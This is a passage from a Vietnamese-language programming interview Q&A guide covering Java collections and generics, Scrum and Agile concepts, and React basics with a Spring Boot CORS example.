- `pop()`: lấy và xóa phần tử đỉnh.
- `peek()`: xem phần tử đỉnh không xóa.

| Thao tác | Độ phức tạp trung bình |
|---|---|
| push | O(1) |
| pop | O(1) |
| peek | O(1) |

```java
Deque<String> callStack = new ArrayDeque<>();
callStack.push("Controller");
callStack.push("Service");
callStack.push("Repository");

System.out.println(callStack.peek()); // Repository
System.out.println(callStack.pop());  // Repository
```

⚠️ Trong Java hiện đại, thường ưu tiên `ArrayDeque` thay vì class `Stack` cũ (`java.util.Stack`) vì hiệu năng tốt hơn và API rõ hơn.

---

### Q183: Queue trong Java là gì?

**Trả lời:**

**Queue** là cấu trúc dữ liệu theo nguyên tắc **FIFO** (First In, First Out): vào trước ra trước.

Method thường dùng:
- `offer(x)`: thêm phần tử vào queue.
- `poll()`: lấy và xóa phần tử đầu (trả `null` nếu rỗng).
- `peek()`: xem phần tử đầu (không xóa).

```java
Queue<String> emailJobs = new ArrayDeque<>();
emailJobs.offer("send-welcome-email");
emailJobs.offer("send-invoice-email");

System.out.println(emailJobs.peek()); // send-welcome-email
System.out.println(emailJobs.poll()); // send-welcome-email
```

Một số implementation phổ biến:
- `ArrayDeque`: queue thường, nhanh, không thread-safe.
- `LinkedList`: vừa list vừa queue.
- `PriorityQueue`: ưu tiên theo comparator, **không** theo FIFO thuần.
- `BlockingQueue` (concurrency): dùng cho producer-consumer.

---

### Q184: LinkedList hoạt động như thế nào?

**Trả lời:**

`LinkedList` trong Java là **doubly linked list**: mỗi node giữ:
- `data`
- tham chiếu `prev`
- tham chiếu `next`

| Tác vụ | LinkedList | ArrayList |
|---|---|---|
| add/remove đầu/cuối | O(1) | O(n) ở đầu, O(1) amortized ở cuối |
| truy cập theo index | O(n) | O(1) |
| bộ nhớ | cao hơn (do node + pointer) | thấp hơn |

```java
LinkedList<String> auditLogs = new LinkedList<>();
auditLogs.addFirst("LOGIN");
auditLogs.addLast("TRANSFER");
auditLogs.removeFirst(); // remove LOGIN
```

Nên dùng `LinkedList` khi thao tác thêm/xóa đầu-cuối nhiều.  
Nếu đọc ngẫu nhiên theo index nhiều, `ArrayList` phù hợp hơn.

---

### Q185: Array trong Java — đặc điểm và lưu ý

**Trả lời:**

Array là cấu trúc:
- Kích thước cố định sau khi tạo.
- Truy cập theo index O(1).
- Chứa primitive hoặc object reference.

```java
int[] dailyTransactions = new int[5];
dailyTransactions[0] = 120;
dailyTransactions[1] = 80;

for (int i = 0; i < dailyTransactions.length; i++) {
    System.out.println(dailyTransactions[i]);
}
```

Lưu ý quan trọng:
1. Không thể tăng/giảm size trực tiếp.
2. Có default value (`0`, `false`, `null` tùy kiểu).
3. ⚠️ Truy cập sai index gây `ArrayIndexOutOfBoundsException`.

Khi cần độ linh hoạt cao (thêm/xóa nhiều), dùng `ArrayList`.

---

### Q186: Generic Class là gì?

**Trả lời:**

Generic class cho phép viết class tái sử dụng với kiểu dữ liệu tổng quát (`<T>`), giúp:
- **Type-safe** ở compile-time.
- Tránh ép kiểu thủ công.
- Reuse một class cho nhiều kiểu.

```java
public class Repository<T> {
    private final List<T> items = new ArrayList<>();

    public void save(T item) {
        items.add(item);
    }

    public T findFirst() {
        return items.isEmpty() ? null : items.get(0);
    }
}

Repository<User> userRepo = new Repository<>();
Repository<Order> orderRepo = new Repository<>();
```

Bạn cũng có thể giới hạn kiểu:

```java
class NumberBox<T extends Number> {
    private T value;
    public NumberBox(T value) { this.value = value; }
    public double asDouble() { return value.doubleValue(); }
}
```

---

### Q187: Generic Method và bounded type (`extends`/`super`)

**Trả lời:**

Generic method cho phép method có type parameter riêng, độc lập với class.

```java
public class MapperUtils {
    public static <T> T first(List<T> items) {
        return items == null || items.isEmpty() ? null : items.get(0);
    }
}
```

Wildcard thường dùng:
- `? extends T`: đọc dữ liệu kiểu T (hoặc subtype), không nên ghi.
- `? super T`: ghi dữ liệu kiểu T an toàn.

Quy tắc **PECS**:
- **Producer Extends**
- **Consumer Super**

```java
public static double sum(List<? extends Number> nums) {
    return nums.stream().mapToDouble(Number::doubleValue).sum();
}

public static void addDefaultUsers(List<? super User> users) {
    users.add(new User("u1001"));
}
```

⚠️ Dùng wildcard đúng giúp API generic vừa an toàn kiểu dữ liệu vừa linh hoạt mở rộng.

---

# PHẦN 9: SCRUM & AGILE

---

### Q206: Agile là gì? 4 giá trị và 12 nguyên tắc cốt lõi (tóm tắt)

**Trả lời:**

**Agile** là cách phát triển phần mềm theo vòng lặp ngắn, feedback nhanh, ưu tiên giá trị cho người dùng.

**4 giá trị Agile Manifesto:**
1. Cá nhân & tương tác hơn quy trình/công cụ.
2. Phần mềm chạy được hơn tài liệu đồ sộ.
3. Hợp tác với khách hàng hơn đàm phán hợp đồng.
4. Phản hồi thay đổi hơn bám cứng kế hoạch.

**12 nguyên tắc (tóm tắt):** giao hàng sớm và liên tục, chấp nhận thay đổi, làm việc sát business, team tự tổ chức, ưu tiên kỹ thuật tốt, nhịp độ bền vững, review và cải tiến liên tục.

---

### Q207: Scrum khác Kanban thế nào? Khi nào chọn cái nào?

**Trả lời:**

| Tiêu chí | Scrum | Kanban |
|---|---|---|
| Nhịp làm việc | Theo Sprint cố định | Continuous flow |
| Vai trò | Rõ PO/SM/Dev | Linh hoạt hơn |
| Kế hoạch | Cam kết theo sprint | Kéo việc theo WIP limit |
| Chỉ số | Velocity, burndown | Lead time, cycle time |

**Chọn Scrum** khi cần cadence rõ cho team mới/product roadmap.  
**Chọn Kanban** khi luồng việc liên tục (support/ops), ưu tiên tối ưu flow.

---

### Q208: 3 vai trò trong Scrum

**Trả lời:**

1. **Product Owner:** quản lý Product Backlog, ưu tiên giá trị business.
2. **Scrum Master:** đảm bảo Scrum được hiểu và áp dụng đúng, gỡ blocker.
3. **Developers:** xây dựng Increment chất lượng trong mỗi Sprint.

---

### Q209: 5 sự kiện Scrum: mục đích và timebox

**Trả lời:**

| Sự kiện | Mục đích | Timebox (Sprint 1 tháng) |
|---|---|---|
| Sprint | Chu kỳ tạo Increment | Tối đa 1 tháng |
| Sprint Planning | Chọn mục tiêu + kế hoạch sprint | Tối đa 8 giờ |
| Daily Scrum | Đồng bộ tiến độ/ngày | 15 phút |
| Sprint Review | Demo + lấy feedback | Tối đa 4 giờ |
| Sprint Retrospective | Cải tiến quy trình team | Tối đa 3 giờ |

---

### Q210: 3 artifacts trong Scrum

**Trả lời:**

1. **Product Backlog:** danh sách yêu cầu toàn sản phẩm (ưu tiên bởi PO).
2. **Sprint Backlog:** phần việc team cam kết trong sprint + kế hoạch thực hiện.
3. **Increment:** phần mềm “Done” có thể release.

---

### Q211: Definition of Done (DoD) là gì? Khác Acceptance Criteria?

**Trả lời:**

- **DoD:** chuẩn chất lượng chung để item được coi là hoàn thành.
- **Acceptance Criteria (AC):** điều kiện nghiệp vụ riêng cho từng story.

**Ví dụ DoD thực tế (user story API tạo user):**
- Code review pass.
- Unit test pass + coverage tối thiểu team quy định.
- API contract cập nhật OpenAPI.
- QA verify trên môi trường test.
- Deploy được lên staging.

---

### Q212: User Story format và INVEST

**Trả lời:**

Format chuẩn:
`As a <role>, I want <goal>, so that <benefit>.`

**INVEST:**
- **I**ndependent
- **N**egotiable
- **V**aluable
- **E**stimable
- **S**mall
- **T**estable

Story tốt cần đủ nhỏ để hoàn thành trong 1 sprint và có AC rõ để test.

---

### Q213: Story Point, Velocity, Burndown Chart

**Trả lời:**

| Khái niệm | Ý nghĩa |
|---|---|
| Story Point | Độ lớn tương đối (độ phức tạp + rủi ro + effort) |
| Velocity | Tổng point “Done” mỗi sprint, dùng forecast |
| Burndown Chart | Biểu đồ lượng việc còn lại theo thời gian |

⚠️ Velocity dùng để dự báo nội bộ team, không dùng để so sánh KPI giữa team.

---

### Q214: Epic vs Feature vs User Story vs Task

**Trả lời:**

| Cấp | Mô tả |
|---|---|
| Epic | Mục tiêu lớn, kéo dài nhiều sprint |
| Feature | Nhóm chức năng có giá trị người dùng |
| User Story | Yêu cầu nhỏ từ góc nhìn người dùng |
| Task | Công việc kỹ thuật cụ thể để hoàn thành story |

Phân cấp phổ biến: **Epic > Feature > User Story > Task**.

---

# PHẦN 10: REACT BASICS

---

### Q215: React là gì? Virtual DOM hoạt động thế nào?

**Trả lời:**

React là thư viện UI theo component.  
Virtual DOM là bản mô tả UI trong memory; React so sánh (diff) virtual DOM cũ/mới rồi update tối thiểu lên DOM thật (**reconciliation**) để tối ưu render.

---

### Q216: JSX là gì? Compile xuống cái gì?

**Trả lời:**

JSX là cú pháp gần HTML trong JavaScript để mô tả UI.

```jsx
const el = <h1>Hello</h1>;
```

Sau transpile (Babel/TS), JSX thành lời gọi hàm:

```js
const el = React.createElement("h1", null, "Hello");
```

---

### Q217: Function Component vs Class Component? Hooks giải quyết gì?

**Trả lời:**

| Loại | Đặc điểm |
|---|---|
| Class Component | Dùng `this`, lifecycle method, verbose |
| Function Component | Ngắn gọn, dễ tái sử dụng logic qua hooks |

Hooks (`useState`, `useEffect`, custom hooks) giải quyết việc quản lý state/effect trong function component mà không cần class.

---

### Q218: `useState` – cách dùng, batching, functional update

**Trả lời:**

```jsx
import { useState } from "react";

function Counter() {
  const [count, setCount] = useState(0);
  return <button onClick={() => setCount(c => c + 1)}>{count}</button>;
}
```

- React batch nhiều state update trong cùng event loop.
- Khi state mới phụ thuộc state cũ, dùng **functional update**: `setCount(c => c + 1)`.

---

### Q219: `useEffect` – dependency array, cleanup, lỗi thường gặp

**Trả lời:**

```jsx
import { useEffect } from "react";

useEffect(() => {
  const id = setInterval(() => console.log("tick"), 1000);
  return () => clearInterval(id); // cleanup khi unmount hoặc dep đổi
}, []); // chạy 1 lần khi mount
```

- `[]`: chạy 1 lần khi mount.
- `[dep]`: chạy lại khi `dep` đổi.
- Không truyền dep: chạy sau mọi render.

⚠️ Infinite loop thường do update state trong effect nhưng dependency không được thiết kế đúng.

---

### Q220: Props vs State – immutability của props

**Trả lời:**

| Khái niệm | Ý nghĩa |
|---|---|
| Props | Dữ liệu từ component cha truyền xuống, **read-only** |
| State | Dữ liệu nội bộ component, thay đổi qua setter |

⚠️ Không mutate props trực tiếp; nếu cần thay đổi, nâng state lên component cha.

---

### Q221: Component lifecycle (mount/update/unmount) và mapping hooks

**Trả lời:**

| Lifecycle | Hooks tương ứng |
|---|---|
| Mount | `useEffect(..., [])` |
| Update | `useEffect(..., [deps])` |
| Unmount | `return cleanup` trong `useEffect` |

Function component không có lifecycle method kiểu class, nhưng hành vi tương đương được mô hình bằng hooks.

---

### Q222: Conditional rendering và list rendering với key

**Trả lời:**

```jsx
function UserList({ users, isLoading }) {
  if (isLoading) return <p>Loading...</p>;
  return (
    <ul>
      {users.map(u => (
        <li key={u.id}>{u.name}</li>
      ))}
    </ul>
  );
}
```

⚠️ `key` cần ổn định (thường dùng `id`), tránh dùng index nếu list có reorder/remove.

---

### Q223: Gọi REST API trong React (fetch/axios) với Spring Boot có CORS

**Trả lời:**

```jsx
import { useEffect, useState } from "react";
import axios from "axios";

function Users() {
  const [users, setUsers] = useState([]);

  useEffect(() => {
    axios.get("http://localhost:8080/api/users")
      .then(res => setUsers(res.data))
      .catch(console.error);
  }, []);

  return <pre>{JSON.stringify(users, null, 2)}</pre>;
}
```

Spring Boot cần bật CORS:

```java
import org.springframework.context.annotation.Bean;
import org.springframework.web.cors.CorsConfiguration;
import org.springframework.web.cors.UrlBasedCorsConfigurationSource;
import org.springframework.web.filter.CorsFilter;

@Bean
CorsFilter corsFilter() {
    CorsConfiguration cfg = new CorsConfiguration();
    cfg.addAllowedOrigin("http://localhost:3000");
    cfg.addAllowedMethod("*");
    cfg.addAllowedHeader("*");
    UrlBasedCorsConfigurationSource src = new UrlBasedCorsConfigurationSource();
    src.registerCorsConfiguration("/**", cfg);
    return new CorsFilter(src);
}
```

---
